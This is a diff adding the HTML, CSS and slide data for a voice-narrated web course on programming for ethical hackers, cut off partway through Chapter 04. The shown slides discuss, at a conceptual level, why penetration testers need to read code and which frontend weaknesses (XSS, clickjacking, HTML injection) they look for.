@@ -1,0 +1,1558 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Programming & Scripting for Ethical Hackers — Video Course</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            --bg: #06050e;
+            --surface: #0c0a1a;
+            --card: #141028;
+            --border: #26204a;
+            --fg: #e4e0f8;
+            --muted: #6a62a0;
+            --accent: #B388FF;
+            --accent-dim: #9b6fe0;
+            --accent-glow: rgba(179, 136, 255, 0.07);
+            --amber: #FFD740;
+            --red: #FF5252;
+            --cyan: #18FFFF;
+            --purple: #EA80FC;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        html,
+        body {
+            height: 100%;
+            overflow: hidden;
+            background: var(--bg);
+            color: var(--fg);
+            font-family: 'Space Grotesk', sans-serif
+        }
+
+        .bg-layer {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none
+        }
+
+        .bg-grid {
+            background-image: linear-gradient(rgba(179, 136, 255, 0.01) 1px, transparent 1px), linear-gradient(90deg, rgba(179, 136, 255, 0.01) 1px, transparent 1px);
+            background-size: 48px 48px;
+        }
+
+        .bg-g1 {
+            width: 700px;
+            height: 700px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(179, 136, 255, 0.04) 0%, transparent 70%);
+            position: absolute;
+            top: -250px;
+            right: -150px;
+            animation: gd1 22s ease-in-out infinite
+        }
+
+        .bg-g2 {
+            width: 500px;
+            height: 500px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255, 110, 64, 0.025) 0%, transparent 70%);
+            position: absolute;
+            bottom: -200px;
+            left: -100px;
+            animation: gd2 28s ease-in-out infinite
+        }
+
+        .bg-g3 {
+            width: 400px;
+            height: 400px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(24, 255, 255, 0.015) 0%, transparent 70%);
+            position: absolute;
+            top: 40%;
+            left: 30%;
+            animation: gd3 18s ease-in-out infinite
+        }
+
+        @keyframes gd1 {
+
+            0%,
+            100% {
+                transform: translate(0, 0)
+            }
+
+            50% {
+                transform: translate(-100px, 80px)
+            }
+        }
+
+        @keyframes gd2 {
+
+            0%,
+            100% {
+                transform: translate(0, 0)
+            }
+
+            50% {
+                transform: translate(70px, -50px)
+            }
+        }
+
+        @keyframes gd3 {
+
+            0%,
+            100% {
+                transform: translate(0, 0)
+            }
+
+            50% {
+                transform: translate(-40px, 30px)
+            }
+        }
+
+        #app {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            height: 100vh
+        }
+
+        .top-bar {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 20px;
+            background: rgba(12, 12, 30, 0.88);
+            backdrop-filter: blur(14px);
+            border-bottom: 1px solid var(--border);
+            flex-shrink: 0
+        }
+
+        .top-bar .logo {
+            color: var(--accent);
+            font-weight: 700;
+            font-size: 14px;
+            letter-spacing: .5px;
+            font-family: 'Fira Code', monospace
+        }
+
+        .top-bar .tt {
+            color: var(--muted);
+            font-size: 13px;
+            flex: 1;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis
+        }
+
+        .cbtn {
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--muted);
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            font-family: inherit;
+            transition: all .2s
+        }
+
+        .cbtn:hover {
+            border-color: var(--accent);
+            color: var(--accent)
+        }
+
+        .cbtn.active {
+            border-color: var(--accent);
+            color: var(--accent);
+            background: var(--accent-glow)
+        }
+
+        .main-area {
+            flex: 1;
+            display: flex;
+            overflow: hidden;
+            position: relative
+        }
+
+        .chaps {
+            width: 290px;
+            background: rgba(12, 12, 30, 0.92);
+            backdrop-filter: blur(14px);
+            border-right: 1px solid var(--border);
+            overflow-y: auto;
+            flex-shrink: 0;
+            transform: translateX(-100%);
+            transition: transform .3s ease;
+            position: absolute;
+            z-index: 10;
+            height: 100%
+        }
+
+        .chaps.open {
+            transform: translateX(0)
+        }
+
+        .chaps::-webkit-scrollbar {
+            width: 4px
+        }
+
+        .chaps::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 4px
+        }
+
+        .ch-hdr {
+            padding: 14px 16px;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--muted);
+            border-bottom: 1px solid var(--border);
+            font-weight: 600
+        }
+
+        .ch-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 9px 16px;
+            cursor: pointer;
+            border-left: 3px solid transparent;
+            transition: all .2s;
+            font-size: 12px;
+            color: var(--muted);
+            line-height: 1.35
+        }
+
+        .ch-item:hover {
+            background: rgba(0, 230, 118, 0.03);
+            color: var(--fg)
+        }
+
+        .ch-item.active {
+            border-left-color: var(--accent);
+            color: var(--accent);
+            background: var(--accent-glow)
+        }
+
+        .ch-item .n {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: 600;
+            border: 1px solid var(--border);
+            flex-shrink: 0;
+            font-family: 'Fira Code', monospace
+        }
+
+        .ch-item.active .n {
+            border-color: var(--accent);
+            background: var(--accent-glow)
+        }
+
+        .pw {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            min-width: 0
+        }
+
+        .player {
+            width: 100%;
+            max-width: 1100px;
+            aspect-ratio: 16/9;
+            background: var(--surface);
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            box-shadow: 0 0 80px rgba(0, 230, 118, 0.025), 0 24px 60px rgba(0, 0, 0, .5);
+            display: flex;
+            flex-direction: column;
+            position: relative
+        }
+
+        .player::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            z-index: 5;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 230, 118, 0.006) 2px, rgba(0, 230, 118, 0.006) 4px)
+        }
+
+        .sa {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column
+        }
+
+        .slide {
+            position: absolute;
+            inset: 0;
+            padding: 32px 40px;
+            display: flex;
+            flex-direction: column;
+            opacity: 0;
+            transform: translateX(30px);
+            transition: opacity .45s ease, transform .45s ease;
+            overflow-y: auto;
+            z-index: 1
+        }
+
+        .slide.active {
+            opacity: 1;
+            transform: translateX(0);
+            z-index: 2
+        }
+
+        .slide.exit {
+            opacity: 0;
+            transform: translateX(-30px);
+            z-index: 1
+        }
+
+        .slide::-webkit-scrollbar {
+            width: 3px
+        }
+
+        .slide::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 3px
+        }
+
+        .sl {
+            font-family: 'Fira Code', monospace;
+            font-size: 11px;
+            color: var(--accent);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+            flex-shrink: 0
+        }
+
+        .st {
+            font-size: clamp(18px, 2.8vw, 30px);
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 16px;
+            flex-shrink: 0;
+            background: linear-gradient(135deg, var(--fg) 0%, var(--muted) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent
+        }
+
+        .sb {
+            flex: 1;
+            overflow-y: auto;
+            padding-right: 6px
+        }
+
+        .sb::-webkit-scrollbar {
+            width: 3px
+        }
+
+        .sb::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 3px
+        }
+
+        .bl {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 9px
+        }
+
+        .bl li {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-size: clamp(12px, 1.5vw, 15px);
+            line-height: 1.6;
+            color: rgba(232, 232, 244, 0.88);
+            opacity: 0;
+            transform: translateY(8px);
+            animation: bi .4s ease forwards
+        }
+
+        .bl li .d {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--accent);
+            flex-shrink: 0;
+            margin-top: 8px
+        }
+
+        @keyframes bi {
+            to {
+                opacity: 1;
+                transform: translateY(0)
+            }
+        }
+
+        .tbl {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: clamp(10px, 1.2vw, 13px)
+        }
+
+        .tbl thead th {
+            text-align: left;
+            padding: 7px 10px;
+            border-bottom: 2px solid var(--accent);
+            color: var(--accent);
+            font-weight: 600;
+            font-family: 'Fira Code', monospace;
+            font-size: clamp(9px, 1.1vw, 11px);
+            text-transform: uppercase;
+            letter-spacing: .4px
+        }
+
+        .tbl tbody td {
+            padding: 6px 10px;
+            border-bottom: 1px solid var(--border);
+            color: rgba(232, 232, 244, 0.82);
+            vertical-align: top
+        }
+
+        .tbl tbody tr:hover {
+            background: rgba(0, 230, 118, 0.025)
+        }
+
+        .code-block {
+            background: #0a0a18;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 14px 18px;
+            font-family: 'Fira Code', monospace;
+            font-size: clamp(10px, 1.2vw, 13px);
+            line-height: 1.7;
+            overflow-x: auto;
+            position: relative
+        }
+
+        .code-block .kw {
+            color: var(--purple)
+        }
+
+        .code-block .fn {
+            color: var(--cyan)
+        }
+
+        .code-block .str {
+            color: var(--accent)
+        }
+
+        .code-block .num {
+            color: var(--amber)
+        }
+
+        .code-block .cm {
+            color: var(--muted);
+            font-style: italic
+        }
+
+        .code-block .op {
+            color: var(--red)
+        }
+
+        .tri-col {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px
+        }
+
+        .tc {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 14px;
+            border-top: 3px solid
+        }
+
+        .tc h4 {
+            font-size: clamp(12px, 1.4vw, 15px);
+            font-weight: 600;
+            margin-bottom: 8px
+        }
+
+        .tc ul {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 5px
+        }
+
+        .tc ul li {
+            font-size: clamp(10px, 1.2vw, 12px);
+            color: var(--muted);
+            line-height: 1.5;
+            display: flex;
+            align-items: flex-start;
+            gap: 6px
+        }
+
+        .tc ul li::before {
+            content: '>';
+            color: var(--accent);
+            font-family: 'Fira Code', monospace;
+            font-weight: 700;
+            flex-shrink: 0;
+            margin-top: 1px
+        }
+
+        .two-col {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px
+        }
+
+        .cc {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 14px;
+            border-top: 3px solid
+        }
+
+        .cc h4 {
+            font-size: clamp(12px, 1.4vw, 15px);
+            font-weight: 600;
+            margin-bottom: 8px
+        }
+
+        .xss-flow {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-wrap: wrap;
+            justify-content: center
+        }
+
+        .xs {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 10px 12px;
+            text-align: center;
+            font-size: clamp(9px, 1.1vw, 12px);
+            min-width: 90px;
+            transition: all .2s
+        }
+
+        .xs:hover {
+            border-color: var(--red);
+            background: rgba(255, 82, 82, 0.06)
+        }
+
+        .xs .xt {
+            font-weight: 600;
+            font-family: 'Fira Code', monospace;
+            margin-bottom: 3px;
+            font-size: clamp(8px, 1vw, 11px)
+        }
+
+        .xa {
+            color: var(--muted);
+            font-size: 14px
+        }
+
+        .sql-viz {
+            background: #0a0a18;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 16px 20px;
+            font-family: 'Fira Code', monospace;
+            font-size: clamp(10px, 1.2vw, 13px);
+            line-height: 2
+        }
+
+        .sql-viz .safe {
+            color: var(--muted)
+        }
+
+        .sql-viz .break {
+            color: var(--red);
+            font-weight: 700
+        }
+
+        .sql-viz .inject {
+            color: var(--amber);
+            font-weight: 700;
+            background: rgba(255, 171, 0, 0.1);
+            padding: 1px 4px;
+            border-radius: 3px
+        }
+
+        .sql-viz .kill {
+            color: #555;
+            text-decoration: line-through
+        }
+
+        .ts {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            height: 100%
+        }
+
+        .ts .mt {
+            font-size: clamp(22px, 3.5vw, 44px);
+            font-weight: 800;
+            line-height: 1.12;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, var(--accent) 0%, var(--amber) 50%, var(--cyan) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent
+        }
+
+        .ts .ms {
+            color: var(--muted);
+            font-size: clamp(11px, 1.4vw, 16px);
+            max-width: 550px;
+            line-height: 1.5
+        }
+
+        .ts .hint {
+            margin-top: 28px;
+            color: var(--accent);
+            font-family: 'Fira Code', monospace;
+            font-size: 12px;
+            animation: pu 2s ease-in-out infinite
+        }
+
+        @keyframes pu {
+
+            0%,
+            100% {
+                opacity: .4
+            }
+
+            50% {
+                opacity: 1
+            }
+        }
+
+        .si {
+            position: absolute;
+            bottom: 10px;
+            right: 14px;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            color: var(--accent);
+            opacity: 0;
+            transition: opacity .3s
+        }
+
+        .si.vis {
+            opacity: 1
+        }
+
+        .sbars {
+            display: flex;
+            gap: 2px;
+            align-items: end;
+            height: 12px
+        }
+
+        .sbar {
+            width: 2px;
+            background: var(--accent);
+            border-radius: 1px;
+            animation: sb .5s ease-in-out infinite
+        }
+
+        .sbar:nth-child(1) {
+            height: 5px;
+            animation-delay: 0s
+        }
+
+        .sbar:nth-child(2) {
+            height: 9px;
+            animation-delay: .12s
+        }
+
+        .sbar:nth-child(3) {
+            height: 12px;
+            animation-delay: .24s
+        }
+
+        .sbar:nth-child(4) {
+            height: 7px;
+            animation-delay: .08s
+        }
+
+        @keyframes sb {
+
+            0%,
+            100% {
+                transform: scaleY(.3)
+            }
+
+            50% {
+                transform: scaleY(1)
+            }
+        }
+
+        .ctrls {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 7px 12px;
+            background: rgba(6, 6, 18, 0.95);
+            border-top: 1px solid var(--border);
+            flex-shrink: 0;
+            position: relative;
+            z-index: 10
+        }
+
+        .cb {
+            background: none;
+            border: none;
+            color: var(--muted);
+            cursor: pointer;
+            font-size: 13px;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 5px;
+            transition: all .15s
+        }
+
+        .cb:hover {
+            color: var(--fg);
+            background: rgba(255, 255, 255, .04)
+        }
+
+        .cb.pb {
+            font-size: 15px;
+            color: var(--accent)
+        }
+
+        .pw2 {
+            flex: 1;
+            height: 5px;
+            background: var(--border);
+            border-radius: 3px;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            min-width: 50px
+        }
+
+        .pf {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-dim), var(--accent));
+            border-radius: 3px;
+            transition: width .3s linear;
+            position: relative
+        }
+
+        .pf::after {
+            content: '';
+            position: absolute;
+            right: -5px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 11px;
+            height: 11px;
+            border-radius: 50%;
+            background: var(--accent);
+            opacity: 0;
+            transition: opacity .2s;
+            box-shadow: 0 0 8px var(--accent)
+        }
+
+        .pw2:hover .pf::after {
+            opacity: 1
+        }
+
+        .td {
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            color: var(--muted);
+            white-space: nowrap
+        }
+
+        .ss {
+            background: var(--card);
+            border: 1px solid var(--border);
+            color: var(--accent);
+            padding: 3px 5px;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            cursor: pointer;
+            outline: none
+        }
+
+        .ss:focus {
+            border-color: var(--accent)
+        }
+
+        .vs {
+            display: flex;
+            align-items: center;
+            gap: 5px
+        }
+
+        .vsl {
+            width: 50px;
+            height: 3px;
+            -webkit-appearance: none;
+            appearance: none;
+            background: var(--border);
+            border-radius: 2px;
+            outline: none;
+            cursor: pointer
+        }
+
+        .vsl::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--accent);
+            cursor: pointer
+        }
+
+        .io {
+            position: absolute;
+            inset: 0;
+            z-index: 20;
+            background: var(--surface);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity .5s ease, visibility .5s
+        }
+
+        .io.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none
+        }
+
+        .io .ii {
+            font-size: 44px;
+            color: var(--accent);
+            margin-bottom: 18px
+        }
+
+        .io .it {
+            font-size: clamp(18px, 2.8vw, 34px);
+            font-weight: 700;
+            margin-bottom: 6px
+        }
+
+        .io .is {
+            color: var(--muted);
+            font-size: 13px;
+            margin-bottom: 26px;
+            text-align: center;
+            max-width: 500px;
+            line-height: 1.5
+        }
+
+        .sbtn {
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 11px 34px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all .2s;
+            box-shadow: 0 0 30px rgba(0, 230, 118, 0.2)
+        }
+
+        .sbtn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 40px rgba(0, 230, 118, 0.35)
+        }
+
+        .eo {
+            position: absolute;
+            inset: 0;
+            z-index: 20;
+            background: rgba(6, 6, 18, .93);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity .5s, visibility .5s
+        }
+
+        .eo.vis {
+            opacity: 1;
+            visibility: visible
+        }
+
+        .eo .et {
+            font-size: 26px;
+            font-weight: 700;
+            color: var(--accent);
+            margin-bottom: 8px
+        }
+
+        .eo .es {
+            color: var(--muted);
+            margin-bottom: 22px;
+            font-size: 13px
+        }
+
+        .rbtn {
+            background: none;
+            border: 2px solid var(--accent);
+            color: var(--accent);
+            padding: 9px 28px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all .2s
+        }
+
+        .rbtn:hover {
+            background: var(--accent);
+            color: var(--bg)
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 70px;
+            left: 50%;
+            transform: translateX(-50%) translateY(16px);
+            background: var(--card);
+            border: 1px solid var(--border);
+            color: var(--fg);
+            padding: 8px 18px;
+            border-radius: 7px;
+            font-size: 12px;
+            z-index: 100;
+            opacity: 0;
+            transition: all .3s;
+            pointer-events: none;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, .4)
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0)
+        }
+
+        .warn-box {
+            background: rgba(255, 82, 82, 0.06);
+            border: 1px solid rgba(255, 82, 82, 0.15);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-size: 12px;
+            color: var(--red);
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-top: 10px
+        }
+
+        .info-box {
+            background: rgba(64, 196, 255, 0.05);
+            border: 1px solid rgba(64, 196, 255, 0.12);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-size: 12px;
+            color: var(--cyan);
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-top: 10px
+        }
+
+        .fix-box {
+            background: rgba(0, 230, 118, 0.05);
+            border: 1px solid rgba(0, 230, 118, 0.12);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-size: 12px;
+            color: var(--accent);
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-top: 10px
+        }
+
+        .dep-tree {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px
+        }
+
+        .dep-node {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-family: 'Fira Code', monospace;
+            font-size: clamp(9px, 1.1vw, 11px);
+            padding: 4px 10px;
+            border-radius: 5px;
+            border: 1px solid var(--border);
+            background: var(--card);
+            transition: all .2s
+        }
+
+        .dep-node.bad {
+            border-color: var(--red);
+            background: rgba(255, 82, 82, 0.08);
+            color: var(--red)
+        }
+
+        .dep-node.core {
+            border-color: var(--amber);
+            background: rgba(255, 171, 0, 0.08);
+            color: var(--amber)
+        }
+
+        .dep-line {
+            width: 1px;
+            height: 8px;
+            background: var(--border)
+        }
+
+        .dep-branch {
+            display: flex;
+            gap: 30px;
+            justify-content: center
+        }
+
+        @media(max-width:768px) {
+            .player {
+                border-radius: 8px;
+                aspect-ratio: auto;
+                height: calc(100vh - 90px)
+            }
+
+            .slide {
+                padding: 18px 20px
+            }
+
+            .two-col,
+            .tri-col {
+                grid-template-columns: 1fr;
+                gap: 10px
+            }
+
+            .chaps {
+                width: 240px
+            }
+
+            .top-bar .tt {
+                display: none
+            }
+        }
+
+        @media(max-width:480px) {
+            .ctrls {
+                gap: 5px;
+                padding: 5px 7px
+            }
+
+            .ss {
+                display: none
+            }
+        }
+
+        :focus-visible {
+            outline: 2px solid var(--accent);
+            outline-offset: 2px
+        }
+
+        @media(prefers-reduced-motion:reduce) {
+
+            *,
+            *::before,
+            *::after {
+                animation-duration: .01ms !important;
+                transition-duration: .01ms !important
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="bg-layer bg-grid"></div>
+    <div class="bg-layer">
+        <div class="bg-g1"></div>
+        <div class="bg-g2"></div>
+        <div class="bg-g3"></div>
+    </div>
+    <div id="app">
+        <div class="top-bar">
+            <button class="cbtn" id="ct" aria-label="Toggle chapters"><i class="fas fa-bars"></i>
+                <span>Chapters</span></button>
+            <div class="logo">&gt;_ SCRIPTING_FOUNDATIONS</div>
+            <div class="tt" id="tt">Programming & Scripting for Ethical Hackers</div>
+            <div style="width:20px"></div>
+        </div>
+        <div class="main-area">
+            <nav class="chaps" id="cp" aria-label="Chapters">
+                <div class="ch-hdr">Chapters</div>
+                <div id="cl"></div>
+            </nav>
+            <div class="pw">
+                <div class="player" id="pl">
+                    <div class="io" id="iov">
+                        <div class="ii"><i class="fas fa-code"></i></div>
+                        <div class="it">Programming & Scripting for Ethical Hackers</div>
+                        <div class="is">HTML &bull; CSS &bull; JavaScript &bull; PHP &bull; Node.js &bull; Python &bull;
+                            SQL — Voice-Guided Video Course</div>
+                        <button class="sbtn" id="sbtn">Start Presentation</button>
+                        <div
+                            style="margin-top:14px;font-size:10px;color:var(--muted);font-family:'Fira Code',monospace">
+                            Browser text-to-speech &bull; Best with headphones</div>
+                    </div>
+                    <div class="eo" id="eov">
+                        <div class="et">Presentation Complete</div>
+                        <div class="es">You've covered all programming foundations for ethical hacking.</div>
+                        <button class="rbtn" id="rbtn"><i class="fas fa-rotate-left"></i> Watch Again</button>
+                    </div>
+                    <div class="sa" id="sa"></div>
+                    <div class="si" id="si">
+                        <div class="sbars">
+                            <div class="sbar"></div>
+                            <div class="sbar"></div>
+                            <div class="sbar"></div>
+                            <div class="sbar"></div>
+                        </div><span>NARRATING</span>
+                    </div>
+                    <div class="ctrls">
+                        <button class="cb" id="pvb" aria-label="Previous"><i class="fas fa-backward-step"></i></button>
+                        <button class="cb pb" id="plb" aria-label="Play/Pause"><i class="fas fa-play"
+                                id="pli"></i></button>
+                        <button class="cb" id="nxb" aria-label="Next"><i class="fas fa-forward-step"></i></button>
+                        <div class="pw2" id="pw2" role="slider" aria-label="Progress" tabindex="0">
+                            <div class="pf" id="pf" style="width:0%"></div>
+                        </div>
+                        <div class="td" id="td">00:00 / 00:00</div>
+                        <select class="ss" id="ss" aria-label="Speed">
+                            <option value="0.75">0.75x</option>
+                            <option value="1" selected>1.0x</option>
+                            <option value="1.25">1.25x</option>
+                            <option value="1.5">1.5x</option>
+                        </select>
+                        <div class="vs">
+                            <button class="cb" id="vb" aria-label="Mute"><i class="fas fa-volume-high"
+                                    id="vi"></i></button>
+                            <input type="range" class="vsl" id="vsl" min="0" max="1" step="0.1" value="1"
+                                aria-label="Volume">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="toast" id="tst"></div>
+
+    <script>
+        const S = [
+            {
+                title: "Programming & Scripting for Ethical Hackers", label: "Introduction",
+                narr: "Programming and Scripting Foundations for Ethical Hacking. This voice-guided presentation explores why code comprehension is the definitive metric separating capable penetration testers from tool-dependent operators. We will cover frontend technologies, backend architectures, Python automation, and SQL injection dynamics.",
+                html: `<div class="ts"><div class="mt">Programming & Scripting<br>for Ethical Hackers</div><div class="ms">Code Comprehension &bull; Frontend Exploitation &bull; Backend Architectures &bull; Python Automation &bull; SQL Injection</div><div class="hint"><i class="fas fa-play"></i>&ensp;Press play to begin narration</div></div>`
+            },
+
+            {
+                title: "The Imperative of Code Comprehension", label: "Chapter 01",
+                narr: "A persistent misconception is that hacking requires only automated tools. In reality, relying solely on vulnerability scanners limits your operational ceiling. Automated tools find known signatures but consistently fail to understand the nuanced business logic of custom applications. Programming enables you to read a codebase, understand developer intentions, and identify logic flaws that scanners miss entirely.",
+                html: `<ul class="bl">
+<li><div class="d"></div><span>Automated tools are proficient at <strong style="color:var(--amber)">known signatures</strong> and outdated versions — nothing more</span></li>
+<li><div class="d"></div><span>They <strong style="color:var(--red)">consistently fail</strong> to understand nuanced business logic of custom-built applications</span></li>
+<li><div class="d"></div><span>Programming lets you <strong style="color:var(--accent)">read raw codebases</strong>, understand developer intentions, and find logic flaws</span></li>
+<li><div class="d"></div><span>Exploits often need <strong style="color:var(--cyan)">heavy modification</strong> for uniquely configured target networks</span></li>
+<li><div class="d"></div><span>Without programming literacy, you are <strong style="color:var(--red)">dependent on others</strong> — an operator, not an engineer</span></li>
+</ul>
+<div class="warn-box"><i class="fas fa-triangle-exclamation"></i><span>"You cannot break what you do not understand." — Automated scanners find low-hanging fruit; zero-days require developer-level thinking.</span></div>`},
+
+            {
+                title: "Custom Tool Development — The Operational Edge", label: "Chapter 02",
+                narr: "The transition from manual testing to automated programmatic assessment marks evolution from novice to advanced professional. When encountering bespoke protocols, proprietary encryption, or non-standard architectures, you must write custom scripts to generate payloads, automate reconnaissance, and extract data from non-standard outputs. This is what separates operators from engineers.",
+                html: `<div class="two-col">
+<div class="cc" style="border-color:var(--red)"><h4 style="color:var(--red)"><i class="fas fa-robot"></i>&ensp;Tool-Dependent Operator</h4>
+<ul class="bl">
+<li><div class="d" style="background:var(--red)"></div><span>Limited to pre-built scanner outputs</span></li>
+<li><div class="d" style="background:var(--red)"></div><span>Cannot adapt exploits to custom targets</span></li>
+<li><div class="d" style="background:var(--red)"></div><span>Blind to business logic vulnerabilities</span></li>
+<li><div class="d" style="background:var(--red)"></div><span>Manual, repetitive, non-scalable workflow</span></li>
+</ul></div>
+<div class="cc" style="border-color:var(--accent)"><h4 style="color:var(--accent)"><i class="fas fa-terminal"></i>&ensp;Scripting Engineer</h4>
+<ul class="bl">
+<li><div class="d"></div><span>Builds custom payloads for any target</span></li>
+<li><div class="d"></div><span>Automates repetitive recon at scale</span></li>
+<li><div class="d"></div><span>Identifies logic flaws in source code</span></li>
+<li><div class="d"></div><span>Handles proprietary protocols and encryption</span></li>
+</ul></div>
+</div>`},
+
+            {
+                title: "Frontend Threat Landscape — HTML, CSS, JavaScript", label: "Chapter 03",
+                narr: "Understanding web technologies is the critical first step in web application penetration testing. The frontend triad of HTML, CSS, and JavaScript dictates how information is structured, styled, and executed within the browser. Ethical hackers analyze these languages not to build interfaces, but to deconstruct them and identify entry points for malicious payloads.",
+                html: `<div class="tri-col">
+<div class="tc" style="border-color:var(--amber)"><h4 style="color:var(--amber)"><i class="fab fa-html5"></i>&ensp;HTML</h4>
+<ul><li>Structural skeleton</li><li>Defines input boundaries</li><li>Hidden fields & forms</li><li>Injection point discovery</li><li>UI redressing vectors</li></ul></div>
+<div class="tc" style="border-color:var(--cyan)"><h4 style="color:var(--cyan)"><i class="fab fa-css3-alt"></i>&ensp;CSS</h4>
+<ul><li>Visual styling layer</li><li>Clickjacking via overlays</li><li>Data exfiltration selectors</li><li>Spam filter evasion</li><li>Opacity-based hiding</li></ul></div>
+<div class="tc" style="border-color:var(--red)"><h4 style="color:var(--red)"><i class="fab fa-js"></i>&ensp;JavaScript</h4>
+<ul><li>Client-side execution engine</li><li>Cross-Site Scripting (XSS)</li><li>DOM manipulation</li><li>Session hijacking</li><li>Logic bypass attacks</li></ul></div>
+</div>`},
+
+            {
+                title: "HTML — Finding Structural Entry Points", label: "Chapter 04",
+                narr: "HTML provides the structural skeleton of web applications. While it doesn't execute logic, it defines boundaries of user input through forms, URL parameters, and hidden fields. Hackers analyze HTML to locate injection points where data flows from client to server. HTML injection occurs when applications fail to sanitize input, allowing attackers to inject malicious markup that alters page appearance or functionality, often facilitating phishing campaigns.",
+                html: `<ul class="bl">
+<li><div class="d"></div><span>HTML defines <strong style="color:var(--amber)">where user data enters</strong> the application — forms, parameters, hidden fields</span></li>
+<li><div class="d"></div><span><strong style="color:var(--cyan)">Developer comments</strong> left in HTML source reveal internal architecture and debug information</span></li>
+<li><div class="d"></div><span><strong style="color:var(--red)">Hidden input fields</strong> (type="hidden") may contain sensitive values like user roles or price overrides</span></li>
+<li><div class="d"></div><span>HTML injection enables <strong style="color:var(--red)">UI redressing</strong> — overlaying malicious elements on legitimate pages</span></li>
